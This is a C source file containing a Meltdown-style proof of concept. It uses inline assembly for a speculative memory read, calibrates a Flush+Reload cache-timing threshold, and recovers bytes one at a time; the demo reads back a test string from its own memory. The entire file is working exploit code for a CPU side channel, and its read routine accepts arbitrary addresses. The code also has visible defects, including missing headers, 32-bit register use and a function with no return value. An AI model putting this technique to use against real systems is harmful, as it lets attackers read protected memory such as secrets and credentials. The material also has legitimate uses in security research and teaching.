// main.cpp
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

static char *_mem = NULL;
static char *mem = NULL;
static size_t phys = 0;
static int CACHE_MISS_THRESHOLD = 0;


#define meltdown                                                               \
  asm volatile("xorl %%eax, %%eax\n"                                           \
               "1:\n"                                                          \
               "movb (%%ecx), %%al\n"                                          \
               "shl $12, %%eax\n"                                              \
               "jz 1b\n"                                                       \
               "movl (%%ebx,%%eax,1), %%ebx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem)                                           \
               : "eax");

static inline void maccess(void *p) {
    asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

static void flush(void *p) {
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
}

static inline uint64_t rdtsc() {
    uint64_t a = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=A"(a));
    asm volatile("mfence");
    return a;
}

static int __attribute((always_inline)) flush_reload(void *ptr) {
    uint64_t start = 0;
    uint64_t end = 0;
    
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    
    flush(ptr);
    
    if (end - start < CACHE_MISS_THRESHOLD) {
        return 1;
    } else {
        return 0;
    }
}

static void detect_flush_reload_threshold() {
    size_t reload_time = 0;
    size_t flush_reload_time = 0;
    size_t i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;
    uint64_t start = 0, end = 0;
    
    maccess(ptr);
    for (i = 0; i < count; i++) {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        reload_time += (end - start);
    }
    for (i = 0; i < count; i++) {
        start = rdtsc();
        maccess(ptr);
        end = rdtsc();
        flush(ptr);
        flush_reload_time += (end - start);
    }
    reload_time /= count;
    flush_reload_time /= count;
    
    CACHE_MISS_THRESHOLD = (flush_reload_time + reload_time * 2) / 3;
}

int testRead() {
    size_t retries = 5;
    uint64_t start = 0;
    uint64_t end = 0;
    
    // Run only once.
    while (retries--) {
        meltdown;
        
        int i;
        for (i = 0; i < 256; i++) {
            if (flush_reload(mem + i * 4096)) {
                if (i >= 1) {
                    return i;
                }
            }
            sched_yield();
        }
        sched_yield();
    }
    return 0;
}

int __attribute__((optimize("-O0"))) read(size_t addr) {
    phys = addr;
    
    char res_stat[256];
    int i, r;
    for (i = 0; i < 256; i++)
        res_stat[i] = 0;
    
    for (i = 0; i < 1; i++) {
        r = testRead();
        res_stat[r]++;
    }
    
    int max_v = 0;
    int max_i = 0;
    for (i = 1; i < 256; i++) {
        if (res_stat[i] > max_v && res_stat[i] >= 1) {
            max_v = res_stat[i];
            max_i = i;
        }
    }
    return max_i;
}

int setEev() {
    detect_flush_reload_threshold();
    
    _mem = (char *)malloc(4096 * 300);
    if (!_mem) {
        return -1;
    }
    mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
    memset(mem, 0xab, 4096 * 290);
    
    int j;
    for (j = 0; j < 256; j++) {
        flush(mem + j * 4096);
    }
    
    return 0;
}

int cleanup() {
    free(_mem);
    return 0;
}

int test() {
    char *name = "Johnny Kuo";
    
    setEev();
    int index = 0;
    
    printf("Expect: %s\n", name);
    printf("We got: ");
    while (index < strlen(name)) {
        int value = read((size_t)(name + index));
        printf("%c", value);
        fflush(stdout);
        index++;
    }
    
    cleanup();
    printf("\n");
}

int main() {
    test();
    return 0;
}
